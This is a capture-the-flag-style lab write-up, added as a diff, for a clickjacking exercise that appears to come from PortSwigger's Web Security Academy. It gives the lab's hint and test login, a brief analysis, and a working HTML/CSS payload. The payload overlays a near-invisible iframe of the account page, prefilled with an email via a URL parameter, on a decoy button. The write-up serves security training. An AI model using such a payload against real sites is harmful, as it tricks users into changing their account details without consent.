@@ -1,0 +1,42 @@
+Lab #2: Clickjacking with form input data prefilled from a URL parameter
+
+Target: Change an email address
+
+This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protection.
+The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.
+
+Hint: 
+    To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. 
+    The lab is solved when the email address is changed.
+    You can log in to your own account using the following credentials: wiener:peter
+
+
+
+Analysis:
+
+  In my-account page there is a update email button and a form with csrf token to update an email. 
+  Note that this page recieves also the new email address as the get parameters. 
+  So it is possible to decieve the victim to change his address into what we want.
+
+  This csrf protection vulnerability might exist in other web applications, every thing is checked but the user is redirected into a payment page with get parameters and
+  no csrf control.
+
+  solution:
+
+  <style>
+    iframe {
+        position: relative; 
+        height: 1000px; 
+        width: 700px;
+        opacity: 0.0000001;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:450px;
+        left:80px;
+        z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe src="myPOrtSwiggerID.web-security-academy.net/my-account?email=aaaa@ere.com"></iframe>
